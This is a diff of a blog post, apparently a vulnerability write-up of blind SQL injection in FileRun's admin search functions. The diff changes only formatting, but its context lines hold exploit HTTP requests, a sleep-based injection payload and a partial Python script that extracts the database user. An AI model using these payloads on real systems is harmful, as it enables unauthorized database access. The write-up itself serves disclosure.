@@ -4,7 +4,6 @@ title: FileRun <= 2017.09.25 Blind SQLi
 categories: articles
 ---
 
-<h1 align="center">{{ page.title }}</h1>
 <p align="right" class="date">{{ page.date | date_to_string }} - scanf</p>
 
 ## 0x00 Preface
@@ -24,7 +23,7 @@ These vulnerabilitys was found after the authentication. After we logged in as `
 
 go to control panel——>Admin——>user——>search,will generate a POST request to the server.
 
-```
+{% highlight javascript %}
 POST /?module=users&section=cpanel&page=list HTTP/1.1
 Host: target.com
 Content-Length: 20
@@ -39,7 +38,7 @@ Cookie: __cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; 
 Connection: close
 
 limit=50&search=aaaa
-```
+{% endhighlight %}
 
 我注意到search参数容易受到SQL注入的影响,通过传入aaaa' 服务器返回了一个500的响应状态:
 
@@ -51,9 +50,9 @@ Use MySQL's delay function sleep () to testing.
 
 <img src="https://i.loli.net/2018/11/30/5c01504c70061.png">
 
-```
+{% highlight javascript %}
 'xor(sleep(5))or'
-```
+{% endhighlight %}
 
 结果如下
 
@@ -63,14 +62,13 @@ Use MySQL's delay function sleep () to testing.
 
 Here I create a simple script to extract current select user()query result using Boolean-based technique.
 
-```
+{% highlight python %}
+
 #!/usr/bin/env python
 # -*- coding:utf-8 -*-
 #__author__ = 'scanf'
 import httplib
 import time
-
-#add cookies
 
 headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',
@@ -96,9 +94,10 @@ for i in range(1, 15):
                 print '\n[in progress]', user,
                 break
 print '\n[Done] MySQL user is %s' % user
-```
 
-```
+{% endhighlight %}
+
+{% highlight javascript %}
 [20:39:20] Start to retrive MySQL User:
 . . . . . . 
 [in progress] f . . . . . . . . . 
@@ -110,7 +109,7 @@ print '\n[Done] MySQL user is %s' % user
 [in progress] filerun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
 [in progress] filerun@ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
 [in progress] filerun@1 . . .
-```
+{% endhighlight %}
 
 ### SQL2
 
@@ -118,7 +117,7 @@ print '\n[Done] MySQL user is %s' % user
 
 control panel——>Metadata——>search Same as SQL1,will generate a POST request to the server:
 
-```
+{% highlight javascript %}
 POST /?module=metadata&section=cpanel&page=list_filetypes HTTP/1.1
 Host: target.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
@@ -132,7 +131,7 @@ Cookie: __cfduid=df5ddd49a2303cb2e13b6aa8ece2af7b11513411363; FileRunSID=fa163cd
 Connection: close
 
 limit=50&search=aaa'xor(sleep(2))or'
-```
+{% endhighlight %}
 
 然后超时后响应:
 
